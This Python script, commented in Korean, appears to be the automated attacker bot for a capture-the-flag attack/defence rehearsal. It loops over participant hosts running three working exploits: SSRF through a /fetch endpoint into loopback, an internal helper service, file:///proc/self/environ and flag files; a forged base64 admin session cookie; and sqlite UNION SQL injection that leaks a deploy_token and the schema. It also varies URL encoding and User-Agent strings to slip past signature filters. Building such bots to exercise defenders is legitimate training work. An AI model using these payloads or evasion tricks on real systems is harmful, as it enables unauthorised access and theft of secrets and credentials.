#!/usr/bin/env python3
"""봇 공격 에이전트 — 결정적(deterministic) 버전.

리허설 스켈레톤 챌린지 3종의 알려진 익스플로잇을 LLM 없이 재현한다. 봇팀이
참가팀의 방어를 시험하는 상대 역할을 하도록, 매 라운드 각 레이어에 대해 정상
경로와 공격 경로를 섞어 반복 시도한다.

  L1 URL Fetcher  : /fetch 로 loopback registry → helper-box/secret SSRF
  L2 Admin Portal : base64 세션의 role 을 admin 으로 위조
  L3 Shop         : product?id 의 sqlite UNION SQLi 로 deploy_token 유출

방어 에이전트가 알려진 공격을 DROP 하면 이 시도는 실패하고, 놓치면 flag 를
제출해 참가팀의 'Flags stolen' 을 올린다. 공격 페이로드에는 인코딩·대소문자
변형을 섞어 단순 정규식 방어를 흔든다.
"""

from __future__ import annotations

import base64
import json
import os
import random
import re
import socket
import time
import urllib.error
import urllib.parse
import urllib.request

TARGETS = [t.strip() for t in os.environ.get("TARGETS", "").split(",") if t.strip()]
PORTS = [int(p) for p in os.environ.get("PORTS", "8082,8083,8084").split(",") if p.strip()]
SUBMIT_URL = os.environ.get("SUBMIT_URL", "http://orchestrator:4100/submit")
SUBMIT_TOKEN = os.environ.get("SUBMIT_TOKEN", "")
LOOP_SLEEP = float(os.environ.get("ATTACK_INTERVAL", "3"))
TIMEOUT = float(os.environ.get("ATTACK_TIMEOUT", "5"))

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")
_submitted: set[str] = set()


def log(msg: str) -> None:
    print(f"[attacker] {msg}", flush=True)


def http(method: str, url: str, headers=None, body=None):
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode("latin-1"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, (e.read().decode("latin-1") if e.fp else ""), dict(e.headers or {})
    except (urllib.error.URLError, OSError):
        return 0, "", {}


def port_open(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def submit(flag: str) -> str:
    if flag in _submitted:
        return "duplicate"
    body = json.dumps({"flag": flag, "token": SUBMIT_TOKEN}).encode()
    req = urllib.request.Request(SUBMIT_URL, data=body, method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            status = json.loads(r.read() or b"{}").get("status", "?")
    except urllib.error.HTTPError as e:
        status = "rate_limited" if e.code == 429 else f"http-{e.code}"
    except (urllib.error.URLError, OSError):
        status = "unreachable"
    if status == "accepted":
        _submitted.add(flag)
        log(f"FLAG accepted {flag}")
    return status


def maybe_flag(text: str) -> str | None:
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


def _variants(raw: str) -> list[str]:
    """단순 시그니처 방어를 흔들기 위한 인코딩 변형."""
    once = urllib.parse.quote(raw, safe="")
    twice = urllib.parse.quote(once, safe="")
    return [raw, once, twice]


# ── L1 SSRF ────────────────────────────────────────────────────────────────
def attack_l1(host: str, port: int) -> str | None:
    base = f"http://{host}:{port}"
    # 1) loopback registry 로 내부 helper URL 획득
    for loop in ("127.0.0.1", "127.1", "0.0.0.0", "localhost", "[::1]"):
        url = f"{base}/fetch?url=" + urllib.parse.quote(f"http://{loop}:{port}/registry", safe="")
        status, body, _ = http("GET", url, headers=_ua())
        if status == 200 and body.strip():
            try:
                internal = base64.b64decode(body.strip()).decode("latin-1")
            except (ValueError, UnicodeDecodeError):
                internal = body.strip()
            for target in (internal, "http://helper-box:8080/secret", "http://helper-box/secret"):
                u = f"{base}/fetch?url=" + urllib.parse.quote(target, safe="")
                s2, b2, _ = http("GET", u, headers=_ua())
                flag = maybe_flag(b2)
                if flag:
                    return flag
    # 2) file 스킴 시도 (구버전 방어 우회 흔적 재현)
    for scheme in ("file:///flags/LAYER2_CHALL1_FLAG", "file:///proc/self/environ"):
        u = f"{base}/fetch?url=" + urllib.parse.quote(scheme, safe="")
        _s, b, _ = http("GET", u, headers=_ua())
        flag = maybe_flag(b)
        if flag:
            return flag
    return None


# ── L2 세션 위조 ─────────────────────────────────────────────────────────────
def attack_l2(host: str, port: int) -> str | None:
    base = f"http://{host}:{port}"
    forged = base64.b64encode(
        json.dumps({"user": "admin", "role": "admin"}).encode()).decode()
    for cookie in (forged, forged.rstrip("=")):
        status, body, _ = http("GET", f"{base}/admin",
                               headers={"Cookie": f"session={cookie}", **_ua()})
        flag = maybe_flag(body)
        if flag:
            return flag
    return None


# ── L3 SQLi ─────────────────────────────────────────────────────────────────
def attack_l3(host: str, port: int) -> str | None:
    base = f"http://{host}:{port}"
    payloads = [
        "0 UNION SELECT k, v, 3 FROM app_meta",
        "0 UNION SELECT 1, v, 3 FROM app_meta WHERE k='deploy_token'",
        "-1 UNION SELECT 1, sql, 3 FROM sqlite_master",
    ]
    for payload in payloads:
        for variant in _variants(payload):
            url = f"{base}/product?id={variant}"
            _s, body, _ = http("GET", url, headers=_ua())
            flag = maybe_flag(body)
            if flag:
                return flag
    return None


def _ua() -> dict:
    return {"User-Agent": random.choice([
        "python-urllib/3.12", "DAH2026-Agent", "Mozilla/5.0 (compatible; bot)",
    ])}


ATTACKS = {8082: attack_l1, 8083: attack_l2, 8084: attack_l3}


def main() -> None:
    log(f"봇 공격 시작 — targets={TARGETS} ports={PORTS}")
    while True:
        for host in TARGETS:
            for port in PORTS:
                if not port_open(host, port):
                    continue
                attack = ATTACKS.get(port)
                if attack is None:
                    continue
                try:
                    flag = attack(host, port)
                except Exception as e:  # 공격 실패가 봇을 죽이지 않게
                    log(f"{host}:{port} 예외 {e}")
                    flag = None
                if flag:
                    result = submit(flag)
                    log(f"{host}:{port} → {result} ({flag[:14]}…)")
        time.sleep(LOOP_SLEEP + random.uniform(0, 1.5))


if __name__ == "__main__":
    main()
